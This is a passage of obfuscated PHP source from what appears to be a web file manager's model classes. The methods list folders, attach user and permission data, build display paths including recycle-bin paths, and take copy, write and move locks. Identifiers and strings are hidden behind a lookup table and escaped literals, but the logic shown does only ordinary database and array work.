$Ò‘Ëú©[78]); $Ò€Ş®ÜŸ = array_to_keyvalue_group($É…æÙ»Â, $Ò‘Ëú©[403]); foreach ($ª£„ú“ as &$¨¸ôŠòÃ) { $¨¸ôŠòÃ[$Ò‘Ëú©[87]] = array($Ò‘Ëú©[477] => 0, $Ò‘Ëú©[478] => 0, $Ò‘Ëú©[479] => 0); if (isset($Ş¸ÊæŠ®[$¨¸ôŠòÃ[$Ò‘Ëú©[403]]])) { $¨¸ôŠòÃ[$Ò‘Ëú©[87]][$Ò‘Ëú©[480]] = 1; $¨¸ôŠòÃ[$Ò‘Ëú©[87]][$Ò‘Ëú©[481]] = $Ş¸ÊæŠ®[$¨¸ôŠòÃ[$Ò‘Ëú©[403]]][$Ò‘Ëú©[32]]; } if (isset($¸Øßø[$¨¸ôŠòÃ[$Ò‘Ëú©[403]]])) { $¨¸ôŠòÃ[$Ò‘Ëú©[87]][$Ò‘Ëú©[482]] = array(); foreach ($¸Øßø[$¨¸ôŠòÃ[$Ò‘Ëú©[403]]] as $ŠıÊôÑ) { $ÀîË£è = $›¨½È[$ŠıÊôÑ]; $¨¸ôŠòÃ[$Ò‘Ëú©[87]][$Ò‘Ëú©[482]][] = array($Ò‘Ëú©[483] => $ÀîË£è[$Ò‘Ëú©[392]], $Ò‘Ëú©[421] => $ÀîË£è[$Ò‘Ëú©[32]], $Ò‘Ëú©[484] => $ÀîË£è[$Ò‘Ëú©[485]]); } } if (isset($Ò€Ş®ÜŸ[$¨¸ôŠòÃ[$Ò‘Ëú©[403]]])) { $¨¸ôŠòÃ[$Ò‘Ëú©[87]][$Ò‘Ëú©[486]] = array(); foreach ($Ò€Ş®ÜŸ[$¨¸ôŠòÃ[$Ò‘Ëú©[403]]] as $Á»²É•§) { $¨¸ôŠòÃ[$Ò‘Ëú©[87]][$Ò‘Ëú©[486]] = array($Ò‘Ëú©[487] => $Á»²É•§[$Ò‘Ëú©[488]], $Ò‘Ëú©[489] => $Á»²É•§[$Ò‘Ëú©[490]], $Ò‘Ëú©[491] => $Á»²É•§[$Ò‘Ëú©[403]], $Ò‘Ëú©[492] => $Á»²É•§[$Ò‘Ëú©[493]], $Ò‘Ëú©[494] => $Á»²É•§[$Ò‘Ëú©[495]], $Ò‘Ëú©[496] => $Á»²É•§[$Ò‘Ëú©[496]], $Ò‘Ëú©[497] => $Á»²É•§[$Ò‘Ëú©[497]]); } } } unset($¨¸ôŠòÃ); return $ª£„ú“; } protected function _listAppendChildren(&$‡ÏŸîÔ¡, $ğ¼æÃÁ) { $ŒÖ¾¯ç =& $_SERVER[Ãìšã«™]; $’‘Òäà = array(); $˜Ğñ½âì = array($ŒÖ¾¯ç[202] => 0, $ŒÖ¾¯ç[203] => 0); foreach ($‡ÏŸîÔ¡ as &$¬½´¯Ä) { if (!$¬½´¯Ä[$ŒÖ¾¯ç[411]]) { continue; } $’‘Òäà[] = $¬½´¯Ä[$ŒÖ¾¯ç[403]]; } unset($¬½´¯Ä); if (!$’‘Òäà) { return; } $Æ´êÛñ½ = array($ŒÖ¾¯ç[498] => array($ŒÖ¾¯ç[7], $’‘Òäà)); $à³¦’Šù = array($ŒÖ¾¯ç[498], $ŒÖ¾¯ç[411], $ŒÖ¾¯ç[499] => $ŒÖ¾¯ç[500]); $Ë¤…¨Å = $this->field($à³¦’Šù)->where($Æ´êÛñ½)->group($ŒÖ¾¯ç[501])->select(); $ôÒÂ¬° = array(); foreach ($Ë¤…¨Å as $Ôµƒ³£‘) { $›õâ‰Ìş = $Ôµƒ³£‘[$ŒÖ¾¯ç[498]]; $ó®Ñ¦£ = $Ôµƒ³£‘[$ŒÖ¾¯ç[411]] == $ŒÖ¾¯ç[89] ? $ŒÖ¾¯ç[203] : $ŒÖ¾¯ç[202]; if (!isset($ôÒÂ¬°[$›õâ‰Ìş])) { $ôÒÂ¬°[$›õâ‰Ìş] = array($ŒÖ¾¯ç[202] => 0, $ŒÖ¾¯ç[203] => 0); } $ôÒÂ¬°[$›õâ‰Ìş][$ó®Ñ¦£] += $Ôµƒ³£‘[$ŒÖ¾¯ç[500]]; } foreach ($‡ÏŸîÔ¡ as &$¬½´¯Ä) { if (!$¬½´¯Ä[$ŒÖ¾¯ç[411]]) { continue; } $ ˜„Ü”À = is_array($ôÒÂ¬°[$¬½´¯Ä[$ŒÖ¾¯ç[403]]]) ? $ôÒÂ¬°[$¬½´¯Ä[$ŒÖ¾¯ç[403]]] : $˜Ğñ½âì; $¬½´¯Ä[$ŒÖ¾¯ç[203]] = $ ˜„Ü”À[$ŒÖ¾¯ç[203]]; $¬½´¯Ä[$ŒÖ¾¯ç[202]] = $ ˜„Ü”À[$ŒÖ¾¯ç[202]]; unset($¬½´¯Ä[$ŒÖ¾¯ç[413]]); } unset($¬½´¯Ä); } protected function _listAppendAuth(&$»Òá¶Á›) { $Œæ¡¬ü¼ =& $_SERVER[Ãìšã«™]; if (!defined($Œæ¡¬ü¼[474])) { return; } $Æ í¦£ = array(); foreach ($»Òá¶Á› as $ÇËµ­‚Á) { if ($ÇËµ­‚Á[$Œæ¡¬ü¼[412]] == self::TYPE_GROUP) { $Æ í¦£[] = $ÇËµ­‚Á[$Œæ¡¬ü¼[403]]; } } if (!$Æ í¦£) { return; } $µ€İ£¡ = array_to_keyvalue($»Òá¶Á›, $Œæ¡¬ü¼[403]); $ØÑ€¬‡ = Model($Œæ¡¬ü¼[502])->getSourceList($Æ í¦£, $µ€İ£¡); foreach ($»Òá¶Á› as $Ø°™©ÅÄ => &$ÇËµ­‚Á) { $ÇËµ­‚Á[$Œæ¡¬ü¼[414]] = $ØÑ€¬‡[$ÇËµ­‚Á[$Œæ¡¬ü¼[403]]]; if (!$ÇËµ­‚Á[$Œæ¡¬ü¼[414]] && $ÇËµ­‚Á[$Œæ¡¬ü¼[412]] == self::TYPE_GROUP) { $ÇËµ­‚Á[$Œæ¡¬ü¼[414]] = Action($Œæ¡¬ü¼[503])->pathGroupAuthMake($ÇËµ­‚Á[$Œæ¡¬ü¼[504]]); if (!$ÇËµ­‚Á[$Œæ¡¬ü¼[414]] && !_get($GLOBALS, $Œæ¡¬ü¼[505])) { $ÇËµ­‚Á[$Œæ¡¬ü¼[195]] = !1; $ÇËµ­‚Á[$Œæ¡¬ü¼[194]] = !1; } } if ($ÇËµ­‚Á[$Œæ¡¬ü¼[414]]) { $ÇËµ­‚Á[$Œæ¡¬ü¼[195]] = AuthModel::authCheckEdit($ÇËµ­‚Á[$Œæ¡¬ü¼[414]][$Œæ¡¬ü¼[415]]); $ÇËµ­‚Á[$Œæ¡¬ü¼[194]] = AuthModel::authCheckView($ÇËµ­‚Á[$Œæ¡¬ü¼[414]][$Œæ¡¬ü¼[415]]); } $this->groupPathDisplay($ÇËµ­‚Á); } unset($ÇËµ­‚Á); } public function _listAppendAuthSecret(&$¥ˆ¼åÂâ) { $§‰Ş«¸ =& $_SERVER[Ãìšã«™]; if (Model($§‰Ş«¸[433])->get($§‰Ş«¸[506]) != $§‰Ş«¸[89]) { return; } static $«¢›”Í¨ = false; if (!$«¢›”Í¨) { $¥Æ¼¯ûÆ = Model($§‰Ş«¸[507]); $“©¼—ô¤ = Model($§‰Ş«¸[508]); $«¢›”Í¨ = $“©¼—ô¤->listData(); $«¢›”Í¨ = array_to_keyvalue($«¢›”Í¨, $§‰Ş«¸[403]); $££¾…ù  = json_decode(Model($§‰Ş«¸[433])->get($§‰Ş«¸[509]), !0); $££¾…ù  = array_to_keyvalue($££¾…ù , $§‰Ş«¸[392]); foreach ($«¢›”Í¨ as $Ä¸Éòú­ => $È½ï¶æ¥) { $ ®é¨È = $££¾…ù [$È½ï¶æ¥[$§‰Ş«¸[510]]]; if (!$ ®é¨È) { $“©¼—ô¤->remove($È½ï¶æ¥[$§‰Ş«¸[392]]); unset($«¢›”Í¨[$Ä¸Éòú­]); continue; } $¢È™±Ş = $¥Æ¼¯ûÆ->listData($ ®é¨È[$§‰Ş«¸[414]]); if (!$¢È™±Ş) { $“©¼—ô¤->remove($È½ï¶æ¥[$§‰Ş«¸[392]]); unset($«¢›”Í¨[$Ä¸Éòú­]); continue; } $È½ï¶æ¥[$§‰Ş«¸[414]] = $¢È™±Ş; $È½ï¶æ¥[$§‰Ş«¸[511]] = $ ®é¨È; $È½ï¶æ¥[$§‰Ş«¸[512]] = Model($§‰Ş«¸[513])->getInfoSimpleOuter($È½ï¶æ¥[$§‰Ş«¸[452]]); $«¢›”Í¨[$Ä¸Éòú­] = $È½ï¶æ¥; } } $Â©“ĞË = defined($§‰Ş«¸[514]) ? USER_ID : $§‰Ş«¸[12]; $¿ıµ¡°ì = array(); $÷Ñìşç = $this->_listAppendPath($¿ıµ¡°ì, !0); foreach ($¥ˆ¼åÂâ as $Ä¸Éòú­ => &$È½ï¶æ¥) { if (!is_array($È½ï¶æ¥[$§‰Ş«¸[414]])) { continue; } if ($È½ï¶æ¥[$§‰Ş«¸[412]] != $§‰Ş«¸[515]) { continue; } if (isset($«¢›”Í¨[$È½ï¶æ¥[$§‰Ş«¸[403]]])) { $ÓÍ¢İœø = $«¢›”Í¨[$È½ï¶æ¥[$§‰Ş«¸[403]]]; if (!is_array($È½ï¶æ¥[$§‰Ş«¸[465]])) { $È½ï¶æ¥[$§‰Ş«¸[465]] = array(); } $È½ï¶æ¥[$§‰Ş«¸[465]][$§‰Ş«¸[516]] = $ÓÍ¢İœø[$§‰Ş«¸[510]]; $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[517]] = $ÓÍ¢İœø; $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[518]] = $È½ï¶æ¥[$§‰Ş«¸[519]]; $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[520]] = $§‰Ş«¸[89]; if ($ÓÍ¢İœø[$§‰Ş«¸[452]] != $Â©“ĞË) { $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[415]] = $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[415]] & $ÓÍ¢İœø[$§‰Ş«¸[414]][$§‰Ş«¸[414]]; } continue; } $„´‰Ë÷Š = $this->parentLevelArray($È½ï¶æ¥[$§‰Ş«¸[521]]); $Ãà¿üø = array_reverse($„´‰Ë÷Š); foreach ($Ãà¿üø as $òêòåòœ => $¿Ç“äÚş) { if (!isset($«¢›”Í¨[$¿Ç“äÚş])) { continue; } $ÓÍ¢İœø = $«¢›”Í¨[$¿Ç“äÚş]; $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[517]] = $ÓÍ¢İœø; if ($ÓÍ¢İœø[$§‰Ş«¸[452]] != $Â©“ĞË) { $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[415]] = $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[415]] & $ÓÍ¢İœø[$§‰Ş«¸[414]][$§‰Ş«¸[414]]; } $“›ø¤ = $§‰Ş«¸[12]; $¶ ö‹’Ÿ = count($„´‰Ë÷Š) - $òêòåòœ; for ($êÙÕïÁô = 0; $êÙÕïÁô < $¶ ö‹’Ÿ; $êÙÕïÁô++) { if (!isset($÷Ñìşç[$„´‰Ë÷Š[$êÙÕïÁô]])) { $“›ø¤ = $§‰Ş«¸[12]; break; } $“›ø¤ = $“›ø¤ . rtrim($÷Ñìşç[$„´‰Ë÷Š[$êÙÕïÁô]], $§‰Ş«¸[8]) . $§‰Ş«¸[8]; } $È½ï¶æ¥[$§‰Ş«¸[414]][$§‰Ş«¸[518]] = rtrim($“›ø¤, $§‰Ş«¸[8]) . $§‰Ş«¸[8]; break; } } unset($È½ï¶æ¥); } public function groupPathDisplay(&$“¬ŒÍ»½) { $¬™¥îìß =& $_SERVER[Ãìšã«™]; if ($“¬ŒÍ»½[$¬™¥îìß[412]] != self::TYPE_GROUP) { return; } $ñşÃÈŠß = Model($¬™¥îìß[522])->getInfo($“¬ŒÍ»½[$¬™¥îìß[504]]); $¢¡»õÃÖ = $this->parentLevelArray($ñşÃÈŠß[$¬™¥îìß[521]]); $­Œş…Ñà = $¬™¥îìß[12]; foreach ($¢¡»õÃÖ as $ôÍ‚‰×Ê) { $«ñıˆÁ = Model($¬™¥îìß[522])->getInfo($ôÍ‚‰×Ê); $­Œş…Ñà .= $«ñıˆÁ[$¬™¥îìß[87]][$¬™¥îìß[403]] . $¬™¥îìß[50]; } $“¬ŒÍ»½[$¬™¥îìß[523]] = $ñşÃÈŠß[$¬™¥îìß[498]]; $“¬ŒÍ»½[$¬™¥îìß[524]] = $ñşÃÈŠß[$¬™¥îìß[521]]; $“¬ŒÍ»½[$¬™¥îìß[525]] = $ñşÃÈŠß[$¬™¥îìß[526]]; $“¬ŒÍ»½[$¬™¥îìß[527]] = $­Œş…Ñà . $ñşÃÈŠß[$¬™¥îìß[87]][$¬™¥îìß[403]]; } protected function _listAppendPath(&$¥´™¡Ó, $ä´Ã…Ü = false) { $µîøÊ´ =& $_SERVER[Ãìšã«™]; static $¿åªª¸ê = array(); $èö‚‘Óà = array(); $Òı’¶º = array(); if ($ä´Ã…Ü) { return $¿åªª¸ê; } foreach ($¥´™¡Ó as &$¨†Ê´º€) { $Ö»³ªÔ” = $¨†Ê´º€[$µîøÊ´[403]]; if ($¨†Ê´º€[$µîøÊ´[411]] == $µîøÊ´[89] && $¨†Ê´º€[$µîøÊ´[498]] != 0) { $¿åªª¸ê[$Ö»³ªÔ”] = $¨†Ê´º€[$µîøÊ´[32]]; } if ($¨†Ê´º€[$µîøÊ´[411]] == $µîøÊ´[89] && $¨†Ê´º€[$µîøÊ´[498]] == 0 && !isset($¿åªª¸ê[$Ö»³ªÔ”])) { $¿åªª¸ê[$Ö»³ªÔ”] = $this->_listAppendPathRoot($¨†Ê´º€, array()); } if (isset($Òı’¶º[$¨†Ê´º€[$µîøÊ´[521]]])) { continue; } $Òı’¶º[$¨†Ê´º€[$µîøÊ´[521]]] = !0; $·ÚÅÉ•á = $this->parentLevelArray($¨†Ê´º€[$µîøÊ´[521]]); foreach ($·ÚÅÉ•á as $¿Ã‡Îõ => $‡ñ†Áı) { if (isset($¿åªª¸ê[$‡ñ†Áı])) { continue; } if ($¿Ã‡Îõ == 0) { $¿åªª¸ê[$‡ñ†Áı] = $this->_listAppendPathRoot($¨†Ê´º€, $·ÚÅÉ•á); } if ($¿Ã‡Îõ != 0) { $èö‚‘Óà[] = $‡ñ†Áı; } } } unset($¨†Ê´º€); $èö‚‘Óà = array_unique($èö‚‘Óà); if (count($èö‚‘Óà) > 0) { $š“şÒ™ğ = array($µîøÊ´[418] => array($µîøÊ´[419], $èö‚‘Óà)); if (count($èö‚‘Óà) == 1) { $”±Çô¬î = $this->sourceInfo($èö‚‘Óà[0]); $ªÆ†Êù = is_array($”±Çô¬î) ? array($”±Çô¬î) : !1; } else { $ªÆ†Êù = $this->field($µîøÊ´[528])->where($š“şÒ™ğ)->select(); } if (!$ªÆ†Êù) { $ªÆ†Êù = array(); } foreach ($ªÆ†Êù as $¿–ÉëÃ) { $¿åªª¸ê[$¿–ÉëÃ[$µîøÊ´[403]]] = $¿–ÉëÃ[$µîøÊ´[32]]; } } $İşÑÁ“‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ÿ¸°Š¯¥ = array(); foreach ($¥´™¡Ó as &$¨†Ê´º€) { $ÀšåŒ×¬ = $¨†Ê´º€[$µîøÊ´[521]]; $şàŒò¼ì = $µîøÊ´[12]; if (isset($Ÿ¸°Š¯¥[$ÀšåŒ×¬])) { $şàŒò¼ì = $Ÿ¸°Š¯¥[$ÀšåŒ×¬]; } else { $·ÚÅÉ•á = $this->parentLevelArray($¨†Ê´º€[$µîøÊ´[521]]); foreach ($·ÚÅÉ•á as $¿Ã‡Îõ => $‡ñ†Áı) { if (isset($¿åªª¸ê[$‡ñ†Áı])) { $şàŒò¼ì .= $¿åªª¸ê[$‡ñ†Áı] . $µîøÊ´[8]; } } $Ÿ¸°Š¯¥[$ÀšåŒ×¬] = $şàŒò¼ì; } $şàŒò¼ì .= $¨†Ê´º€[$µîøÊ´[32]]; if ($¨†Ê´º€[$µîøÊ´[411]] == $µîøÊ´[89]) { $şàŒò¼ì .= $µîøÊ´[8]; } $¨†Ê´º€[$µîøÊ´[519]] = str_replace($µîøÊ´[529], $µîøÊ´[8], $şàŒò¼ì); if ($¨†Ê´º€[$µîøÊ´[498]] == $µîøÊ´[190]) { $¨†Ê´º€[$µîøÊ´[32]] = trim($¿åªª¸ê[$¨†Ê´º€[$µîøÊ´[403]]], $µîøÊ´[8]); $¨†Ê´º€[$µîøÊ´[519]] = $¨†Ê´º€[$µîøÊ´[32]] . $µîøÊ´[8]; } if (intval($¨†Ê´º€[$µîøÊ´[412]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¨†Ê´º€, $·ÚÅÉ•á, $İşÑÁ“‚); } } unset($¨†Ê´º€); return $¥´™¡Ó; } private function _listAppendPathRecycle(&$¿«ıĞ¦ü, $¢°ùƒ©, $ñÃ¸çì†) { $è¼®Ÿñ =& $_SERVER[Ãìšã«™]; if (!in_array($ñÃ¸çì†, $¢°ùƒ©) && $¿«ıĞ¦ü[$è¼®Ÿñ[403]] != $ñÃ¸çì†) { return; } $‹ÕÅäõÉ = explode($è¼®Ÿñ[8], trim($¿«ıĞ¦ü[$è¼®Ÿñ[519]], $è¼®Ÿñ[8])); $Şñ‡ëúâ = implode($è¼®Ÿñ[8], array_slice($‹ÕÅäõÉ, 2)); $¿«ıĞ¦ü[$è¼®Ÿñ[519]] = $è¼®Ÿñ[8] . LNG($è¼®Ÿñ[530]) . $è¼®Ÿñ[8] . ltrim($Şñ‡ëúâ, $è¼®Ÿñ[8]); $¿«ıĞ¦ü[$è¼®Ÿñ[521]] = $è¼®Ÿñ[531] . implode($è¼®Ÿñ[50], array_slice($¢°ùƒ©, 1)) . $è¼®Ÿñ[50]; if ($¿«ıĞ¦ü[$è¼®Ÿñ[403]] == $ñÃ¸çì†) { $¿«ıĞ¦ü[$è¼®Ÿñ[521]] = $è¼®Ÿñ[531]; $¿«ıĞ¦ü[$è¼®Ÿñ[498]] = $è¼®Ÿñ[190]; $¿«ıĞ¦ü[$è¼®Ÿñ[32]] = LNG($è¼®Ÿñ[530]); } $¿«ıĞ¦ü[$è¼®Ÿñ[532]] = $è¼®Ÿñ[533]; } protected function _listAppendPathRoot(&$ÁÏıÏã‹, $ä½Èïƒ) { $ŸÁş±Ÿº =& $_SERVER[Ãìšã«™]; $¥ªÄì»ß = $ŸÁş±Ÿº[12]; if ($ÁÏıÏã‹[$ŸÁş±Ÿº[412]] == self::TYPE_USER) { if (defined($ŸÁş±Ÿº[474]) && $ÁÏıÏã‹[$ŸÁş±Ÿº[504]] == USER_ID) { $¥ªÄì»ß = LNG($ŸÁş±Ÿº[534]); if (!$ä½Èïƒ) { $ÁÏıÏã‹[$ŸÁş±Ÿº[32]] = $¥ªÄì»ß; } } else { $ÇÖ€Ï¿… = Model($ŸÁş±Ÿº[513])->getInfoSimple($ÁÏıÏã‹[$ŸÁş±Ÿº[504]]); $¥ªÄì»ß = LNG($ŸÁş±Ÿº[535]) . $ŸÁş±Ÿº[159] . $ÇÖ€Ï¿…[$ŸÁş±Ÿº[32]] . $ŸÁş±Ÿº[536]; } } else { if ($ÁÏıÏã‹[$ŸÁş±Ÿº[412]] == self::TYPE_GROUP) { $ÇÖ€Ï¿… = Model($ŸÁş±Ÿº[522])->getInfoSimple($ÁÏıÏã‹[$ŸÁş±Ÿº[504]]); $¥ªÄì»ß = $ÇÖ€Ï¿…[$ŸÁş±Ÿº[32]]; } else { if ($ÁÏıÏã‹[$ŸÁş±Ÿº[412]] == self::TYPE_SYSTEM) { $¥ªÄì»ß = $ŸÁş±Ÿº[537]; } } } $¥ªÄì»ß = $¥ªÄì»ß ? $ŸÁş±Ÿº[8] . $¥ªÄì»ß . $ŸÁş±Ÿº[8] : $ŸÁş±Ÿº[8]; return $¥ªÄì»ß; } protected function _listAppendUser(&$¬ŒÅÇ’í) { $‚–Ü¾³¨ =& $_SERVER[Ãìšã«™]; $áÒö¯†Æ = array_to_keyvalue($¬ŒÅÇ’í, $‚–Ü¾³¨[12], $‚–Ü¾³¨[452]); $Ş’µ´ˆè = array_to_keyvalue($¬ŒÅÇ’í, $‚–Ü¾³¨[12], $‚–Ü¾³¨[454]); $Áì²Àñ = array_merge($áÒö¯†Æ, $Ş’µ´ˆè); $Á›Ö’ ò = Model($‚–Ü¾³¨[538])->userListInfo($Áì²Àñ); foreach ($¬ŒÅÇ’í as &$´»×Çõ™) { $¨”Ùµ©• = $´»×Çõ™[$‚–Ü¾³¨[452]]; $´»×Çõ™[$‚–Ü¾³¨[452]] = $Á›Ö’ ò[$¨”Ùµ©•] ? $Á›Ö’ ò[$¨”Ùµ©•] : !1; $¨”Ùµ©• = $´»×Çõ™[$‚–Ü¾³¨[454]]; $´»×Çõ™[$‚–Ü¾³¨[454]] = $Á›Ö’ ò[$¨”Ùµ©•] ? $Á›Ö’ ò[$¨”Ùµ©•] : !1; if (isset($´»×Çõ™[$‚–Ü¾³¨[465]]) && $´»×Çõ™[$‚–Ü¾³¨[465]][$‚–Ü¾³¨[539]]) { $˜Ìğ‚é“ = $GLOBALS[$‚–Ü¾³¨[6]][$‚–Ü¾³¨[90]][$‚–Ü¾³¨[540]]; if ($´»×Çõ™[$‚–Ü¾³¨[465]][$‚–Ü¾³¨[541]] <= time() - $˜Ìğ‚é“) { $this->metaSet($´»×Çõ™[$‚–Ü¾³¨[403]], $‚–Ü¾³¨[539], null); $this->metaSet($´»×Çõ™[$‚–Ü¾³¨[403]], $‚–Ü¾³¨[541], null); unset($´»×Çõ™[$‚–Ü¾³¨[465]][$‚–Ü¾³¨[539]]); continue; } $ÆÂØ±­Ø = $´»×Çõ™[$‚–Ü¾³¨[465]][$‚–Ü¾³¨[539]]; $´»×Çõ™[$‚–Ü¾³¨[465]][$‚–Ü¾³¨[542]] = Model($‚–Ü¾³¨[538])->getInfoSimpleOuter($ÆÂØ±­Ø); } } unset($´»×Çõ™); } public function parentLevelArray($ÚöõÒÅã) { $¬ˆ½Ù›÷ =& $_SERVER[Ãìšã«™]; $ÚöõÒÅã = explode($¬ˆ½Ù›÷[50], trim($ÚöõÒÅã, $¬ˆ½Ù›÷[50])); return array_remove_value($ÚöõÒÅã, $¬ˆ½Ù›÷[190]); } public function listAll($üìÍº¿‚) { $Ò›öÍâ =& $_SERVER[Ãìšã«™]; $ùã“Ù˜õ = $this->sourceInfo($üìÍº¿‚); $Õ´³¥¦í = array($Ò›öÍâ[543] => array($Ò›öÍâ[544], $ùã“Ù˜õ[$Ò›öÍâ[521]] . $üìÍº¿‚ . $Ò›öÍâ[545]), $Ò›öÍâ[546] => 0); $ßü­Ï‡ä = $Ò›öÍâ[547]; $îß”ÚÍ = "\114\x45\x46\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\x69\157\x5f\x66\151\x6c\x65\x20\146\151\x6c\145\x20\x6f\x6e\40\163\157\x75\162\x63\145\x2e\146\151\154\145\111\104\40\x3d\x20\x66\x69\154\145\56\146\151\x6c\x65\x49\104"; $ šå˜Úİ = $this->alias($Ò›öÍâ[444])->field($ßü­Ï‡ä)->where($Õ´³¥¦í)->join($îß”ÚÍ)->select(); $this->_listAppendAuth($ šå˜Úİ); $this->_listAppendUser($ šå˜Úİ); $this->_listAppendPath($ šå˜Úİ); $ šå˜Úİ = array_to_keyvalue($ šå˜Úİ, $Ò›öÍâ[403]); $ê·®ñ = "\57{$ùã“Ù˜õ[$Ò›öÍâ[32]]}\x2f"; $ê·®ñ = $ê·®ñ == $Ò›öÍâ[529] ? $Ò›öÍâ[8] : $ê·®ñ; $…ÌÌû¦ì = array(); foreach ($ šå˜Úİ as $®ÆÛ«–— => $çá—ß¦) { $ïˆÉ³¦° = $this->parentLevelArray($çá—ß¦[$Ò›öÍâ[521]]); array_shift($ïˆÉ³¦°); $«êøĞ˜â = $ê·®ñ; for ($‚…Ä–³Á = 0; $‚…Ä–³Á < count($ïˆÉ³¦°); $‚…Ä–³Á++) { $«êøĞ˜â .= $ šå˜Úİ[$ïˆÉ³¦°[$‚…Ä–³Á]][$Ò›öÍâ[32]] . $Ò›öÍâ[8]; } $«êøĞ˜â .= $çá—ß¦[$Ò›öÍâ[32]]; if ($çá—ß¦[$Ò›öÍâ[411]]) { $«êøĞ˜â .= $Ò›öÍâ[8]; } $«êøĞ˜â = str_replace($Ò›öÍâ[529], $Ò›öÍâ[8], $«êøĞ˜â); $«êøĞ˜â = str_replace($Ò›öÍâ[529], $Ò›öÍâ[8], $«êøĞ˜â); $Ş…‹Şßş = array($Ò›öÍâ[422] => str_replace($Ò›öÍâ[529], $Ò›öÍâ[8], $«êøĞ˜â), $Ò›öÍâ[548] => intval($çá—ß¦[$Ò›öÍâ[411]]), $Ò›öÍâ[87] => $this->pathInfoFilter($çá—ß¦)); if (!$çá—ß¦[$Ò›öÍâ[411]]) { $Ş…‹Şßş[$Ò›öÍâ[467]] = $çá—ß¦[$Ò›öÍâ[467]]; $Ş…‹Şßş[$Ò›öÍâ[88]] = $çá—ß¦[$Ò›öÍâ[78]]; } $…ÌÌû¦ì[] = $Ş…‹Şßş; } return $…ÌÌû¦ì; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ì‘û‘·’) { $ÒÅ¬… =& $_SERVER[Ãìšã«™]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÒÅ¬…[549], $ì‘û‘·’); $Œ¨ÚÂø = 1; $this->_lockEvent($ì‘û‘·’, array($ÒÅ¬…[550], $ÒÅ¬…[551]), $Œ¨ÚÂø); $this->_lockParent($ì‘û‘·’, array($ÒÅ¬…[551]), $Œ¨ÚÂø); $this->_lockEvent($ì‘û‘·’, array($ÒÅ¬…[552], $ÒÅ¬…[553]), $Œ¨ÚÂø); $this->_lockCheckEnd($ÒÅ¬…[549], $ì‘û‘·’); } public function lockCopyEnd($ı¤®½Œ) { $ËçôÉ†— =& $_SERVER[Ãìšã«™]; if (!$this->allowLock()) { return; } $„›öá¸ş = 0; $this->_lockEvent($ı¤®½Œ, array($ËçôÉ†—[550], $ËçôÉ†—[551]), $„›öá¸ş); $this->_lockParent($ı¤®½Œ, array($ËçôÉ†—[551]), $„›öá¸ş); $this->_lockEvent($ı¤®½Œ, array($ËçôÉ†—[552], $ËçôÉ†—[553]), $„›öá¸ş); } public function lockWriteStart($ŞÊÊ¹çÚ, $©àğÎüá = '') { $ŠëˆøÍñ =& $_SERVER[Ãìšã«™]; if (!$this->allowLock()) { return; } $this->_lockCheck($ŠëˆøÍñ[550], $ŞÊÊ¹çÚ); $’±Ğ£•ø = 1; $this->_lockKey($ŠëˆøÍñ[554] . $ŞÊÊ¹çÚ . $ŠëˆøÍñ[10] . $©àğÎüá, $’±Ğ£•ø); $this->_lockEvent($ŞÊÊ¹çÚ, array($ŠëˆøÍñ[549], $ŠëˆøÍñ[551]), $’±Ğ£•ø); $this->_lockParent($ŞÊÊ¹çÚ, array($ŠëˆøÍñ[549], $ŠëˆøÍñ[551]), $’±Ğ£•ø); $this->_lockCheckEnd($ŠëˆøÍñ[550], $ŞÊÊ¹çÚ); } public function lockWriteEnd($ş¸”…Î“, $Ä½ıåºí = '') { $öÈºş‘ =& $_SERVER[Ãìšã«™]; if (!$this->allowLock()) { return; } $€†ï§¦œ = 0; $this->_lockKey($öÈºş‘[554] . $ş¸”…Î“ . $öÈºş‘[10] . $Ä½ıåºí, $€†ï§¦œ); $this->_lockEvent($ş¸”…Î“, array($öÈºş‘[549], $öÈºş‘[551]), $€†ï§¦œ); $this->_lockParent($ş¸”…Î“, array($öÈºş‘[549], $öÈºş‘[551]), $€†ï§¦œ); } public function lockMoveStart($ë¸¨ñ¦à) { $ª‘Şøğ… =& $_SERVER[Ãìšã«™]; if (!$this->allowLock()) { return; } $this->_lockCheck($ª‘Şøğ…[551], $ë¸¨ñ¦à); $àÁÃíè = 1; $this->_lockKey($ª‘Şøğ…[555] . $ë¸¨ñ¦à, $àÁÃíè); $this->_lockEvent($ë¸¨ñ¦à, array($ª‘Şøğ…[549], $ª‘Şøğ…[550]), $àÁÃíè); $this->_lockParent($ë¸¨ñ¦à, array($ª‘Şøğ…[549], $ª‘Şøğ…[551]), $àÁÃíè); $this->_lockEvent($ë¸¨ñ¦à, array($ª‘Şøğ…[556], $ª‘Şøğ…[552], $ª‘Şøğ…[553]), $àÁÃíè); $this->_lockCheckEnd($ª‘Şøğ…[551], $ë¸¨ñ¦à); } public function lockMoveEnd($¨Á®‚†‘) { $»šÊí–ü =& $_SERVER[Ãìšã«™]; if (!$this->allowLock()) { return; } $ò˜æ«ıÈ = 0; $this->_lockKey($»šÊí–ü[555] . $¨Á®‚†‘, $ò˜æ«ıÈ); $this->_lockEvent($¨Á®‚†‘, array($»šÊí–ü[549], $»šÊí–ü[550]), $ò˜æ«ıÈ); $this->_lockParent($¨Á®‚†‘, array($»šÊí–ü[549], $»šÊí–ü[551]), $ò˜æ«ıÈ); $this->_lockEvent($¨Á®‚†‘, array($»šÊí–ü[556], $»šÊí–ü[552], $»šÊí–ü[553]), $ò˜æ«ıÈ); } private function _lockCheck($¨×ú‡‘‹, $£ö×³ë†) { $³íĞ¨è =& $_SERVER[Ãìšã«™]; $ÔÎËš» = $this->sourceInfo($£ö×³ë†); $ä–îÄç = $¨×ú‡‘‹ . $³íĞ¨è[10] . $£ö×³ë†; $this->_lockTimeStart[$ä–îÄç] = timeFloat(); if (!is_array($ÔÎËš»)) { return; } $Ë“”„öÑ = 